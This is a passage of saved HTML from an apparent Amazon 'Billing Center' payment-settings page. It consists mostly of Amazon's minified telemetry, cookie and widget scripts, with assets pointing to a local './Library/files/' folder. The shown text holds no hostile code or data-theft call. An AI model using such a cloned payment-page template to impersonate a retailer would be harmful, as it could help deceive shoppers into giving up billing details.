  background-image: url(https://images-na.ssl-images-amazon.com/images/G/01/gno/sprites/nav-sprite-global_bluebeacon-1x_optimized_layout1._CB468670774_.png);
  background-position: 0 1000px;
  background-repeat: repeat-x;
}
.nav-spinner {
  background-image: url(https://images-na.ssl-images-amazon.com/images/G/01/javascripts/lib/popover/images/snake._CB485935611_.gif);
  background-position: center center;
  background-repeat: no-repeat;
}
.nav-timeline-icon, .nav-access-image, .nav-timeline-prime-icon {
  background-image: url(https://images-na.ssl-images-amazon.com/images/G/01/gno/sprites/timeline_sprite_1x._CB485945973_.png);
  background-repeat: no-repeat;
}
</style><!-- NAVYAAN CSS -->
<link rel="stylesheet" href="./Library/files/21taIyvn9cL._RC_71VsaH3dCcL.css,21TJB5pc5TL.css,31vGzsqCErL.css,21lRUdwotiL.css,41tc24mJIGL.css,11G4HxMtMSL.css,31OvHRW+XiL.css,01XHMOHpK1L.css_.css">
<!-- sp:feature:host-assets -->
















<script type="text/javascript">var ue_t0=ue_t0||+new Date();</script>
<script type="text/javascript">
window.ue_ihb = (window.ue_ihb || window.ueinit || 0) + 1;
if (window.ue_ihb === 1) {

var ue_csm = window,
    ue_hob = +new Date();
(function(d){var e=d.ue=d.ue||{},f=Date.now||function(){return+new Date};e.d=function(b){return f()-(b?0:d.ue_t0)};e.stub=function(b,a){if(!b[a]){var c=[];b[a]=function(){c.push([c.slice.call(arguments),e.d(),d.ue_id])};b[a].replay=function(b){for(var a;a=c.shift();)b(a[0],a[1],a[2])};b[a].isStub=1}};e.exec=function(b,a){return function(){try{return b.apply(this,arguments)}catch(c){ueLogError(c,{attribution:a||"undefined",logLevel:"WARN"})}}}})(ue_csm);


    var ue_err_chan = 'jserr-rw';
(function(d,e){function h(f,b){if(!(a.ec>a.mxe)&&f){a.ter.push(f);b=b||{};var c=f.logLevel||b.logLevel;c&&c!==k&&c!==m&&c!==n&&c!==p||a.ec++;c&&c!=k||a.ecf++;b.pageURL=""+(e.location?e.location.href:"");b.logLevel=c;b.attribution=f.attribution||b.attribution;a.erl.push({ex:f,info:b})}}function l(a,b,c,e,g){d.ueLogError({m:a,f:b,l:c,c:""+e,err:g,fromOnError:1,args:arguments},g?{attribution:g.attribution,logLevel:g.logLevel}:void 0);return!1}var k="FATAL",m="ERROR",n="WARN",p="DOWNGRADED",a={ec:0,ecf:0,
pec:0,ts:0,erl:[],ter:[],mxe:50,startTimer:function(){a.ts++;setInterval(function(){d.ue&&a.pec<a.ec&&d.uex("at");a.pec=a.ec},1E4)}};l.skipTrace=1;h.skipTrace=1;h.isStub=1;d.ueLogError=h;d.ue_err=a;e.onerror=l})(ue_csm,window);


var ue_id = 'YF5GA687BG8W5SSXJPYR',
    ue_url = '/uedata/uedata',
    ue_navtiming = 1,
    ue_mid = 'ATVPDKIKX0DER',
    ue_sid = '144-6121204-6279753',
    ue_sn = 'www.amazon.com',
    ue_furl = 'fls-na.amazon.com',
    ue_surl = 'https://unagi-na.amazon.com/1/events/com.amazon.csm.nexusclient.prod',
    ue_int = 0,
    ue_fcsn = 1,
    ue_urt = 3,
    ue_rpl_ns = 'cel-rpl',
    ue_ddq = 1,
    ue_fpf = '//fls-na.amazon.com/1/batch/1/OP/ATVPDKIKX0DER:144-6121204-6279753:YF5GA687BG8W5SSXJPYR$uedata=s:',
    ue_sbuimp = 1,

    ue_swi = 1;
function ue_viz(){(function(c,e,a){function k(b){if(c.ue.viz.length<p&&!l){var a=b.type;b=b.originalEvent;/^focus./.test(a)&&b&&(b.toElement||b.fromElement||b.relatedTarget)||(a=e[m]||("blur"==a||"focusout"==a?"hidden":"visible"),c.ue.viz.push(a+":"+(+new Date-c.ue.t0)),"visible"==a&&(ue.isl&&uex("at"),l=1))}}for(var l=0,f,g,m,n=["","webkit","o","ms","moz"],d=0,p=20,h=0;h<n.length&&!d;h++)if(a=n[h],f=(a?a+"H":"h")+"idden",d="boolean"==typeof e[f])g=a+"visibilitychange",m=(a?a+"V":"v")+"isibilityState";
k({});d&&e.addEventListener(g,k,0);c.ue&&d&&(c.ue.pageViz={event:g,propHid:f})})(ue_csm,document,window)};

(function(d,k,K){function E(a){return a&&a.replace&&a.replace(/^\s+|\s+$/g,"")}function r(a){return"undefined"===typeof a}function F(a,b){for(var c in b)b[t](c)&&(a[c]=b[c])}function G(a){try{var b=K.cookie.match(RegExp("(^| )"+a+"=([^;]+)"));if(b)return b[2].trim()}catch(c){}}function L(p,b,c){p&&(d.ue_id=a.id=a.rid=p,w=w.replace(/((.*?:){2})(\w+)/,function(a,b){return b+p}));b&&(w=w.replace(/(.*?:)(\w|-)+/,function(a,c){return c+b}),d.ue_sid=b);c&&a.tag("page-source:"+c);d.ue_fpf=w}function M(){var a=
{};return function(b){b&&(a[b]=1);b=[];for(var c in a)a[t](c)&&b.push(c);return b}}function x(d,b,c,e){e=e||+new B;var f,m,y=k.csa;if(b||r(c)){if(d){f=b?h("t",b)||h("t",b,{}):a.t;f[d]=e;for(m in c)c[t](m)&&h(m,b,c[m]);!b&&k.ue_csa_pl&&y&&y("PageTiming")("mark",Z[d]||d)}return e}}function h(d,b,c){var e=b&&b!=a.id?a.sc[b]:a;e||(e=a.sc[b]={});"id"===d&&c&&(N=1);return e[d]=c||e[d]}function O(d,b,c,e,f){c="on"+c;var h=b[c];"function"===typeof h?d&&(a.h[d]=h):h=function(){};b[c]=function(a){f?(e(a),h(a)):
(h(a),e(a))};b[c]&&(b[c].isUeh=1)}function P(p,b,c,e){function q(b,c){var d=[b],g=0,e={},f,k;c?(d.push("m=1"),e[c]=1):e=a.sc;for(k in e)if(e[t](k)){var q=h("wb",k),m=h("t",k)||{},n=h("t0",k)||a.t0,l;if(c||2==q){q=q?g++:"";d.push("sc"+q+"="+k);for(l in m)3>=l.length&&!r(m[l])&&null!==m[l]&&d.push(l+q+"="+(m[l]-n));d.push("t"+q+"="+m[p]);if(h("ctb",k)||h("wb",k))f=1}}!v&&f&&d.push("ctb=1");return d.join("&")}function m(b,c,g,e){if(b){var f=d.ue_err;d.ue_url&&!e&&b&&0<b.length&&(e=new Image,a.iel.push(e),
e.src=b,a.count&&a.count("postbackImageSize",b.length));if(w){var h=k.encodeURIComponent;h&&b&&(e=new Image,b=""+d.ue_fpf+h(b)+":"+(+new B-d.ue_t0),a.iel.push(e),e.src=b)}else a.log&&(a.log(b,"uedata",{n:1}),a.ielf.push(b));f&&!f.ts&&f.startTimer();a.b&&(f=a.b,a.b="",m(f,c,g,1))}}function y(b){var c=z?z.type:C,d=c&&2!=c,e=a.bfini;N||(e&&1<e&&(b+="&bfform=1",d||(a.isBFT=e-1)),2==c&&(b+="&bfnt=1",a.isBFT=a.isBFT||1),a.ssw&&a.isBFT&&(r(a.isNRBF)&&(c=a.ssw(a.oid),c.e||r(c.val)||(a.isNRBF=1<c.val?0:1)),
r(a.isNRBF)||(b+="&nrbf="+a.isNRBF)),a.isBFT&&!a.isNRBF&&(b+="&bft="+a.isBFT));return b}if(!a.paused&&(b||r(c))){for(var l in c)c[t](l)&&h(l,b,c[l]);x("pc",b,c);l=h("id",b)||a.id;var g=a.url+"?"+p+"&v="+a.v+"&id="+l,v=h("ctb",b)||h("wb",b),n,u;v&&(g+="&ctb="+v);1<d.ueinit&&(g+="&ic="+d.ueinit);if(!("ld"!=p&&"ul"!=p||b&&b!=l)){if("ld"==p){try{k[H]&&k[H].isUeh&&(k[H]=null)}catch(G){}if(k.chrome)for(u=0;u<I.length;u++)Q(D,I[u]);(u=K.ue_backdetect)&&u.ue_back&&u.ue_back.value++;d._uess&&(n=d._uess());
a.isl=1}a._bf&&(g+="&bf="+a._bf());d.ue_navtiming&&f&&(h("ctb",l,"1"),x("tc",C,C,J));A&&!R&&(f&&F(a.t,{na_:f.navigationStart,ul_:f.unloadEventStart,_ul:f.unloadEventEnd,rd_:f.redirectStart,_rd:f.redirectEnd,fe_:f.fetchStart,lk_:f.domainLookupStart,_lk:f.domainLookupEnd,co_:f.connectStart,_co:f.connectEnd,sc_:f.secureConnectionStart,rq_:f.requestStart,rs_:f.responseStart,_rs:f.responseEnd,dl_:f.domLoading,di_:f.domInteractive,de_:f.domContentLoadedEventStart,_de:f.domContentLoadedEventEnd,_dc:f.domComplete,
ld_:f.loadEventStart,_ld:f.loadEventEnd,ntd:("function"!==typeof A.now||r(J)?0:new B(J+A.now())-new B)+a.t0}),z&&F(a.t,{ty:z.type+a.t0,rc:z.redirectCount+a.t0}),R=1);F(a.t,{hob:d.ue_hob,hoe:d.ue_hoe});a.ifr&&(g+="&ifr=1")}x(p,b,c,e);c="ld"==p&&b&&h("wb",b);var s;c||b&&b!==l||$(b);c||l==a.oid||aa(l,(h("t",b)||{}).tc||+h("t0",b),+h("t0",b));(e=d.ue_mbl)&&e.cnt&&!c&&(g+=e.cnt());c?h("wb",b,2):"ld"==p&&(a.lid=E(l));for(s in a.sc)if(1==h("wb",s))break;if(c){if(a.s)return;g=q(g,null)}else e=q(g,null),e!=
g&&(e=y(e),a.b=e),n&&(g+=n),g=q(g,b||a.id);g=y(g);if(a.b||c)for(s in a.sc)2==h("wb",s)&&delete a.sc[s];n=0;a._rt&&(g+="&rt="+a._rt());c||(a.s=0,(n=d.ue_err)&&0<n.ec&&n.pec<n.ec&&(n.pec=n.ec,g+="&ec="+n.ec+"&ecf="+n.ecf),n=h("ctb",b),h("t",b,{}));a.tag&&a.tag().length&&(g+="&csmtags="+a.tag().join("|"),a.tag=M());s=a.viz||[];(e=s.length)&&(g+="&viz="+s.splice(0,e).join("|"));r(d.ue_pty)||(g+="&pty="+d.ue_pty+"&spty="+d.ue_spty+"&pti="+d.ue_pti);a.tabid&&(g+="&tid="+a.tabid);a.aftb&&(g+="&aftb=1");
!a._ui||b&&b!=l||(g+=a._ui());a.a=g;m(g,p,n,c)}}function $(a){var b=k.ue_csm_markers||{},c;for(c in b)b[t](c)&&x(c,a,C,b[c])}function v(a,b,c){c=c||k;if(c[S])c[S](a,b,!1);else if(c[T])c[T]("on"+a,b)}function Q(a,b,c){c=c||k;if(c[U])c[U](a,b,!1);else if(c[V])c[V]("on"+a,b)}function W(){function a(){d.onUl()}function b(a){return function(){c[a]||(c[a]=1,P(a))}}var c={},e,f;d.onLd=b("ld");d.onLdEnd=b("ld");d.onUl=b("ul");e={stop:b("os")};k.chrome?(v(D,a),I.push(a)):e[D]=d.onUl;for(f in e)e[t](f)&&O(0,
k,f,e[f]);d.ue_viz&&ue_viz();v("load",d.onLd);x("ue")}function aa(f,b,c){var e=d.ue_mbl,h=k.csa,m=h&&h("SPA"),h=h&&h("Content");e&&e.ajax&&e.ajax(b,c);m&&h&&(m("newPage",{requestId:f,transitionType:"soft"}),h("get","page")("emit","loaded"));a.tag("ajax-transition")}d.ueinit=(d.ueinit||0)+1;var a=d.ue=d.ue||{};a.t0=k.aPageStart||d.ue_t0;a.id=d.ue_id;a.url=d.ue_url;a.rid=d.ue_id;a.a="";a.b="";a.h={};a.s=1;a.t={};a.sc={};a.iel=[];a.ielf=[];a.viz=[];a.v="0.210678.0";a.paused=!1;var t="hasOwnProperty",
D="beforeunload",H="on"+D,S="addEventListener",U="removeEventListener",T="attachEvent",V="detachEvent",Z={cf:"criticalFeature",af:"aboveTheFold",fn:"functional",bb:"bodyBegin",be:"bodyEnd",ld:"loaded"},B=k.Date,A=k.performance||k.webkitPerformance,f=(A||{}).timing,z=(A||{}).navigation,J=(f||{}).navigationStart,w=d.ue_fpf,N=0,R=0,I=[],C;a.oid=E(a.id);a.lid=E(a.id);a._t0=a.t0;a.tag=M();a.ifr=k.top!==k.self||k.frameElement?1:0;a.attach=v;a.detach=Q;if("000-0000000-8675309"===d.ue_sid){var X=G("cdn-rid"),
Y=G("session-id");X&&Y&&L(X,Y,"cdn")}d.uei=W;d.ueh=O;d.ues=h;d.uet=x;d.uex=P;a.reset=L;a.pause=function(d){a.paused=d};W()})(ue_csm,window,ue_csm.document);


ue.stub(ue,"log");ue.stub(ue,"onunload");ue.stub(ue,"onflush");
(function(c){var a=c.ue;a.cv={};a.cv.scopes={};a.count=function(d,c,b){var e={},f=a.cv,g=b&&0===b.c;e.counter=d;e.value=c;e.t=a.d();b&&b.scope&&(f=a.cv.scopes[b.scope]=a.cv.scopes[b.scope]||{},e.scope=b.scope);if(void 0===c)return f[d];f[d]=c;d=0;b&&b.bf&&(d=1);ue_csm.ue_sclog||!a.clog||0!==d||g?a.log&&a.log(e,"csmcount",{c:1,bf:d}):a.clog(e,"csmcount",{bf:d})};a.count("baselineCounter2",1);a&&a.event&&(a.event({requestId:c.ue_id||"rid",server:c.ue_sn||"sn",obfuscatedMarketplaceId:c.ue_mid||"mid"},
"csm","csm.CSMBaselineEvent.4"),a.count("nexusBaselineCounter",1,{bf:1}))})(ue_csm);



var ue_hoe = +new Date();
}
window.ueinit = window.ue_ihb;
</script>

<!-- 2xjrs -->
<title> Billing Center </title>

<link rel="stylesheet" href="./Library/files/style.css">
<script>
    window.P && P.register('sp.load.js');
</script>





<script type="text/javascript">
    P.when('jQuery', 'ready').register('form-helper', function($) {

    /**
     * Helper function for constructing and submitting a hidden form
     *
     * @param method specifies how to send form data (ie. GET, POST)
     * @param action Where to send the form data when the form is submitted
     * @param formData Data to be sent
     */
    function submitForm(method, action, formData) {
        var $form = $("<form></form>").attr({
            method: method,
            action: action
        });
        for (var key in formData) {
            if (formData.hasOwnProperty(key)) {
                $('<input type="hidden" />').attr({
                    name: key,
                    value: formData[key]
                }).appendTo($form);
            }
        }
        $('body').append($form);
        $form.submit();
    }

    return {
        submitForm: submitForm
    }
});

    
    window.widgets = {};

    window.APXConfig = {
        onWidgetCreated: [function(widget) {
            widgets[widget.type] = widget;

            var subPageHandler =
                
                    
                    {
                        "WidgetAction": function(eventObj) {
                            if (eventObj.widgetAction === "save-backup-payment-methods" && eventObj.widgetActionType === "manage-backup-payment-methods") {
                                // Redirect to base settings page and display success message
                                var formData = {
                                  bpmUpdateSuccess: true
                                };
                                window.P.when('jQuery', 'form-helper', 'ready').execute(function($, formHelper) {
                                    formHelper.submitForm("get", "/cpe/yourpayments/settings", formData);
                                });
                            } else if (eventObj.widgetAction === "cancel-backup-payment-methods" && eventObj.widgetActionType === "manage-backup-payment-methods") {
                                // Redirect to base settings page only
                                window.location.href = "/cpe/yourpayments/settings";
                            }
                        }
                    };
                    
                    
                    
                    
                    
                    
                    
                    
                

            var allHandlers = {
                "AuthTimeout" : function() {
                    window.location.reload();
                    return APX.events.STOP_EVENT_PROCESSING;
                },
                "Fatal" : function() {
                    return APX.events.STOP_EVENT_PROCESSING;
                },
                "Done" : function() {
                    return APX.events.STOP_EVENT_PROCESSING;
                }
            };

            for (var prop in subPageHandler) {
                allHandlers[prop] = subPageHandler[prop];
            }

            for (var event in allHandlers) {
                widget.on(event, allHandlers[event]);
            }
        }]
    };
</script>



<script type="text/javascript">
window.ue_ihe = (window.ue_ihe || 0) + 1;
if (window.ue_ihe === 1) {
(function(k,l,g){function m(a){c||(c=b[a.type].id,"undefined"===typeof a.clientX?(e=a.pageX,f=a.pageY):(e=a.clientX,f=a.clientY),2!=c||h&&(h!=e||n!=f)?(r(),d.isl&&l.setTimeout(function(){p("at",d.id)},0)):(h=e,n=f,c=0))}function r(){for(var a in b)b.hasOwnProperty(a)&&d.detach(a,m,b[a].parent)}function s(){for(var a in b)b.hasOwnProperty(a)&&d.attach(a,m,b[a].parent)}function t(){var a="";!q&&c&&(q=1,a+="&ui="+c);return a}var d=k.ue,p=k.uex,q=0,c=0,h,n,e,f,b={click:{id:1,parent:g},mousemove:{id:2,
parent:g},scroll:{id:3,parent:l},keydown:{id:4,parent:g}};d&&p&&(s(),d._ui=t)})(ue_csm,window,document);



(function(s,l){function m(b,e,c){c=c||new Date(+new Date+t);c="expires="+c.toUTCString();n.cookie=b+"="+e+";"+c+";path=/"}function p(b){b+="=";for(var e=n.cookie.split(";"),c=0;c<e.length;c++){for(var a=e[c];" "==a.charAt(0);)a=a.substring(1);if(0===a.indexOf(b))return decodeURIComponent(a.substring(b.length,a.length))}return""}function q(b,e,c){if(!e)return b;-1<b.indexOf("{")&&(b="");for(var a=b.split("&"),f,d=!1,h=!1,g=0;g<a.length;g++)f=a[g].split(":"),f[0]==e?(!c||d?a.splice(g,1):(f[1]=c,a[g]=
f.join(":")),h=d=!0):2>f.length&&(a.splice(g,1),h=!0);h&&(b=a.join("&"));!d&&c&&(0<b.length&&(b+="&"),b+=e+":"+c);return b}var k=s.ue||{},t=6048E7,n=ue_csm.document||l.document,r=null,d;a:{try{d=l.localStorage;break a}catch(u){}d=void 0}k.count&&k.count("csm.cookieSize",document.cookie.length);k.cookie={get:p,set:m,updateCsmHit:function(b,e,c){try{var a;if(!(a=r)){var f;a:{try{if(d&&d.getItem){f=d.getItem("csm-hit");break a}}catch(k){}f=void 0}a=f||p("csm-hit")||"{}"}a=q(a,b,e);r=a=q(a,"t",+new Date);
try{d&&d.setItem&&d.setItem("csm-hit",a)}catch(h){}m("csm-hit",a,c)}catch(g){"function"==typeof l.ueLogError&&ueLogError(Error("Cookie manager: "+g.message),{logLevel:"WARN"})}}}})(ue_csm,window);

(function(l,d){function c(b){b="";var c=a.isBFT?"b":"s",d=""+a.oid,f=""+a.lid,g=d;d!=f&&20==f.length&&(c+="a",g+="-"+f);a.tabid&&(b=a.tabid+"+");b+=c+"-"+g;b!=e&&100>b.length&&(e=b,a.cookie?a.cookie.updateCsmHit(m,b+("|"+ +new Date)):document.cookie="csm-hit="+b+("|"+ +new Date)+n+"; path=/")}function p(){e=0}function h(b){!0===d[a.pageViz.propHid]?e=0:!1===d[a.pageViz.propHid]&&c({type:"visible"})}var n="; expires="+(new Date(+new Date+6048E5)).toGMTString(),m="tb",e,a=l.ue||{},k=a.pageViz&&a.pageViz.event&&
a.pageViz.propHid;a.attach&&(a.attach("click",c),a.attach("keyup",c),k||(a.attach("focus",c),a.attach("blur",p)),k&&(a.attach(a.pageViz.event,h,d),h({})));a.aftb=1})(ue_csm,document);


ue_csm.ue.stub(ue,"impression");


ue.stub(ue,"trigger");



if(window.ue&&uet) { uet('bb'); }

}
</script><!--&&&Portal&Delimiter&&&--><!-- sp:end-feature:host-assets -->
<script type="text/javascript">
window.ue_ihe = (window.ue_ihe || 0) + 1;
if (window.ue_ihe === 1) {
(function(k,l,g){function m(a){c||(c=b[a.type].id,"undefined"===typeof a.clientX?(e=a.pageX,f=a.pageY):(e=a.clientX,f=a.clientY),2!=c||h&&(h!=e||n!=f)?(r(),d.isl&&l.setTimeout(function(){p("at",d.id)},0)):(h=e,n=f,c=0))}function r(){for(var a in b)b.hasOwnProperty(a)&&d.detach(a,m,b[a].parent)}function s(){for(var a in b)b.hasOwnProperty(a)&&d.attach(a,m,b[a].parent)}function t(){var a="";!q&&c&&(q=1,a+="&ui="+c);return a}var d=k.ue,p=k.uex,q=0,c=0,h,n,e,f,b={click:{id:1,parent:g},mousemove:{id:2,
parent:g},scroll:{id:3,parent:l},keydown:{id:4,parent:g}};d&&p&&(s(),d._ui=t)})(ue_csm,window,document);



(function(s,l){function m(b,e,c){c=c||new Date(+new Date+t);c="expires="+c.toUTCString();n.cookie=b+"="+e+";"+c+";path=/"}function p(b){b+="=";for(var e=n.cookie.split(";"),c=0;c<e.length;c++){for(var a=e[c];" "==a.charAt(0);)a=a.substring(1);if(0===a.indexOf(b))return decodeURIComponent(a.substring(b.length,a.length))}return""}function q(b,e,c){if(!e)return b;-1<b.indexOf("{")&&(b="");for(var a=b.split("&"),f,d=!1,h=!1,g=0;g<a.length;g++)f=a[g].split(":"),f[0]==e?(!c||d?a.splice(g,1):(f[1]=c,a[g]=
f.join(":")),h=d=!0):2>f.length&&(a.splice(g,1),h=!0);h&&(b=a.join("&"));!d&&c&&(0<b.length&&(b+="&"),b+=e+":"+c);return b}var k=s.ue||{},t=6048E7,n=ue_csm.document||l.document,r=null,d;a:{try{d=l.localStorage;break a}catch(u){}d=void 0}k.count&&k.count("csm.cookieSize",document.cookie.length);k.cookie={get:p,set:m,updateCsmHit:function(b,e,c){try{var a;if(!(a=r)){var f;a:{try{if(d&&d.getItem){f=d.getItem("csm-hit");break a}}catch(k){}f=void 0}a=f||p("csm-hit")||"{}"}a=q(a,b,e);r=a=q(a,"t",+new Date);
try{d&&d.setItem&&d.setItem("csm-hit",a)}catch(h){}m("csm-hit",a,c)}catch(g){"function"==typeof l.ueLogError&&ueLogError(Error("Cookie manager: "+g.message),{logLevel:"WARN"})}}}})(ue_csm,window);

(function(l,d){function c(b){b="";var c=a.isBFT?"b":"s",d=""+a.oid,f=""+a.lid,g=d;d!=f&&20==f.length&&(c+="a",g+="-"+f);a.tabid&&(b=a.tabid+"+");b+=c+"-"+g;b!=e&&100>b.length&&(e=b,a.cookie?a.cookie.updateCsmHit(m,b+("|"+ +new Date)):document.cookie="csm-hit="+b+("|"+ +new Date)+n+"; path=/")}function p(){e=0}function h(b){!0===d[a.pageViz.propHid]?e=0:!1===d[a.pageViz.propHid]&&c({type:"visible"})}var n="; expires="+(new Date(+new Date+6048E5)).toGMTString(),m="tb",e,a=l.ue||{},k=a.pageViz&&a.pageViz.event&&
a.pageViz.propHid;a.attach&&(a.attach("click",c),a.attach("keyup",c),k||(a.attach("focus",c),a.attach("blur",p)),k&&(a.attach(a.pageViz.event,h,d),h({})));a.aftb=1})(ue_csm,document);


ue_csm.ue.stub(ue,"impression");


ue.stub(ue,"trigger");



if(window.ue&&uet) { uet('bb'); }

}
</script><!-- sp:feature:head-close -->
<script>
window.P && P.register('bb');
if (typeof ues === 'function') {
  ues('t0', 'portal-bb', new Date());
  ues('ctb', 'portal-bb', 1);
}
</script>
<script type="text/javascript" async="" crossorigin="anonymous" src="./Library/files/61-6nKPKyWL.js.download"></script><script type="text/javascript" async="" crossorigin="anonymous" src="./Library/files/11-BZEJ8lnL._RC_61xmyjKeOpL.js,21Of0-9HPCL.js,012FVc3131L.js,11S5WBtBslL.js,51CF7BmbF2L.js,11AHlQhPRjL.js,016iHgpF74L.js,11aNYFFS5hL.js,116tgw9TSaL.js,211-p4GRUCL.js,01PoLXBDXWL.js,616HiO8WWWL.js,01ezj5.download"></script><script type="text/javascript" async="" crossorigin="anonymous" src="./Library/files/51s75BysibL.js.download"></script><script type="text/javascript" async="" crossorigin="anonymous" src="./Library/files/411rWMfhQqL._RC_71bD7Jez7wL.js,61nu+N-SMyL.js,41W9ohA0e+L.js,11vrNkbdcvL.js,21qaguVEGfL.js,41QN7vBTpzL.js,51wilTzvmEL.js,313jWehHlpL.js_.js.download"></script><style>.s-suggestion { padding: 8px 10px; font-size: 16px; font-family: "Amazon Ember"; cursor: pointer; }</style></head><!-- sp:feature:start-body -->
<body class="a-m-us a-aui_72554-c a-aui_dropdown_187959-c a-aui_pci_risk_banner_210084-c a-aui_perf_130093-c a-aui_preload_261698-c a-aui_tnr_v2_180836-c a-aui_ux_145937-c a-meter-animate"><div id="a-page"><script type="a-state" data-a-state="{&quot;key&quot;:&quot;a-wlab-states&quot;}">{"AUI_TNR_V2_180836":"C","AUI_UX_145937":"C","AUI_PRELOAD_261698":"C","AUI_72554":"C","AUI_DROPDOWN_187959":"C","AUI_PCI_RISK_BANNER_210084":"C","AUI_PERF_130093":"C"}</script><script>typeof uex === 'function' && uex('ld', 'portal-bb', {wb: 1})</script>

<script>
!function(){function n(n,t){var r=i(n);return t&&(r=r("instance",t)),r}var r=[],c=0,i=function(t){return function(){var n=c++;return r.push([t,[].slice.call(arguments,0),n,{time:Date.now()}]),i(n)}};n._s=r,this.csa=n}();;
csa('Config', {});
if (window.csa) {
    csa("Config", {
        'Application': 'Retail',
        'ObfuscatedMarketplaceId': 'ATVPDKIKX0DER',
        'Events.SushiEndpoint': 'https://unagi.amazon.com/1/events/com.amazon.csm.csa.prod',
        'CacheDetection.RequestID': "YF5GA687BG8W5SSXJPYR",
        'CacheDetection.Callback': window.ue && ue.reset
    });

    csa("Events")("setEntity", {
        page: {requestId: "YF5GA687BG8W5SSXJPYR", meaningful: "interactive"},
        session: {id: "144-6121204-6279753"}
    });
}
!function(n){var e,o,r="splice",i=n.csa,t={},u={},f=n.csa._s,c=0,a={},s={},l=setTimeout,g=Object.keys;function h(n,t){return i(n,t)}function d(n,t){var i=u[n]||{};O(i,t),u[n]=i,l(y,0)}function p(n,t){a[n]||(a[n]=[]),a[n].push(t)}function v(n,t){if(n in s)t(s[n]);else{p(n,function(n){return t(n),!1})}}function m(n){if(t.DEBUG)throw n}function w(){return Math.abs(4294967295*Math.random()|0).toString(36)}function b(n,t){return function(){try{n.apply(this,arguments)}catch(n){}}}function y(){for(var n=0;n<f.length;){var t=f[n],i=t[0]in u;if(!i&&!o)return void(c=t.length);i?(f[r](c=n,1),S(t)):n++}}function S(n){var arguments,t=u[n[0]],i=(arguments=n[1])[0];if(!t||!t[i])return m("Undefined function: "+t+"/"+i);e=n[3],u[n[2]]=t[i].apply(t,arguments.slice(1))||{},e=0}function D(){o=1,y()}function O(t,i){g(i).forEach(function(n){t[n]=i[n]})}v("$beforeunload",D),d("Config",{instance:function(n){O(t,n)}}),i.plugin=b(function(n){n(h)}),h.config=t,h.register=d,h.on=p,h.removeListener=function(n,t){var i=a[n];i&&i[r](i.indexOf(t),1)},h.once=v,h.emit=function(n,t){for(var i=a[n]||[],e=0;e<i.length;)!1===i[e](t)?i[r](e,1):e++;s[n]=t||{}},h.UUID=function(){return[w(),w(),w(),w()].join("-")},h.time=function(n){var t=e?new Date(e.time):new Date;return"ISO"===n?t.toISOString():t.getTime()},h.error=m,h.exec=b,(h.global=n).csa._s.push=function(n){n[0]in u&&(!f.length||o)?S(n):f[r](c++,0,n)},y(),l(function(){l(D,t.SkipMissingPluginsTimeout||5e3)},1)}("undefined"!=typeof window?window:global);csa.plugin(function(t){var e;function n(){if(!e)try{e=t.global.localStorage||{}}catch(t){e={}}}t.store=function(t,c){try{if(n(),!t)return Object.keys(e);if(!c)return e[t];e[t]=c}catch(t){}},t.deleteStored=function(t){try{n(),delete e[t]}catch(t){}}});csa.plugin(function(n){var r,e=n.global,o=n("Events"),i=e.location,f=e.document,a=((e.performance||{}).navigation||{}).type,t=e.addEventListener,c=n.emit;function d(a){var e=!!r;e&&(c("$beforePageTransition"),c("$pageTransition"),o("removeEntity","page"));var t={schemaId:"csa.PageEntity.1",id:r=n.UUID(),url:i.href,server:i.hostname,path:i.pathname,referrer:f.referrer,title:f.title};Object.keys(a||{}).forEach(function(e){t[e]=a[e]}),o("setEntity",{page:t}),e&&c("$afterPageTransition")}function l(){c("$load"),c("$afterload")}function s(){c("$beforeunload"),c("$unload"),c("$afterunload")}i&&f&&(t&&(t("beforeunload",s),t("pagehide",s),"complete"===f.readyState?l():t("load",l)),n.register("SPA",{newPage:d}),d({transitionType:{0:"hard",1:"refresh",2:"back-button"}[a]||"unknown"}))});csa.plugin(function(c){var t="UNKNOWN",u="id",r="all",e="messageId",i="timestamp",a="producerId",o="application",f="obfuscatedMarketplaceId",s="entities",d="schemaId",l="version",p="attributes",v=c.config,I=c("Transport"),g={},m=function(n,t){Object.keys(n).forEach(t)};function O(e,i,o){m(i,function(n){var t=o===r||(o||{})[n];n in e||(e[n]={version:1,id:i[n][u]||c.UUID()}),b(e[n],i[n],t)})}function b(t,e,i){m(e,function(n){!0!==i&&1!==i&&!function(n,t){return n===u||!!~(t||[]).indexOf(n)}(n,i)||(t[n]=e[n])})}function y(o,n,c){m(n,function(n){var t=o[n];if(t[d]){var e={},i={};E(e),e[u]=t[u],e[a]=t[a]||c,e[d]=t[d],e[l]=t[l]++,b(e[p]=i,t,1),U(i),I("log",e)}})}function E(n){n[i]=function(n){return"number"==typeof n&&(n=new Date(n).toISOString()),n||c.time("ISO")}(n[i]),n[e]=c.UUID(),n[o]=v.Application||t,n[f]=v.ObfuscatedMarketplaceId||t}function U(n){delete n[l],delete n[d],delete n[a]}function h(o){var c={};this.log=function(n,t){var e={},i=(t||{}).ent;E(n),O(e,g,i),O(e,c,i),O(e,n[s]||{},i),m(e,function(n){U(e[n])}),n[a]=o[a],n[s]=e,I("log",n)},this.setEntity=function(n){O(c,n,r),y(c,n,o[a])}}c.register("Events",{setEntity:function(n){O(g,n,r),y(g,n,"csa")},removeEntity:function(n){delete g[n]},instance:function(n){return new h(n)}})});csa.plugin(function(s){var c,l="Transport",d="post",u="preflight",r="csa.cajun.",i="store",a="deleteStored",n="addEventListener",f="sendBeacon",t=0,e=s.config[l+".BufferSize"]||2e3,g=s.config[l+".RetryDelay"]||1500,o=[],h=0,p=[],v=s.global,y=v.document,m=s.config[l+".FlushInterval"]||5e3,E=0;function T(n){if(864e5<s.time()-+new Date(n.timestamp))return s.error("Event is too old: "+n);h<e&&(o.push(n),h++,!E&&t&&(E=setTimeout(R,m)))}function R(){p.forEach(function(t){var e=[];o.forEach(function(n){t.accepts(n)&&e.push(n)}),e.length&&(t.chunks?t.chunks(e).forEach(function(n){S(t,n)}):S(t,e))}),o=[],E=0}function S(t,e){function o(){s[a](r+n)}var n=s.UUID();s[i](r+n,JSON.stringify(e)),[function(n,t,e){var o=v.navigator||{},r=v.cordova||{};if(!o[f]||!n[d])return 0;n[u]&&r&&"ios"===r.platformId&&!c&&((new Image).src=n[u]().url,c=1);var i=n[d](t);if(!i.type&&o[f](i.url,i.body))return e(),1},function(n,t,e){if(!n[d])return 0;var o=n[d](t),r=o.url,i=o.body,c=o.type,u=new XMLHttpRequest,a=0;function f(n,t,e){u.open("POST",n),e&&u.setRequestHeader("Content-Type",e),u.send(t)}return u.onload=function(){u.status<299?e():s.config[l+".XHRRetries"]&&a<3&&setTimeout(function(){f(r,i,c)},++a*g)},f(r,i,c),1}].some(function(n){try{return 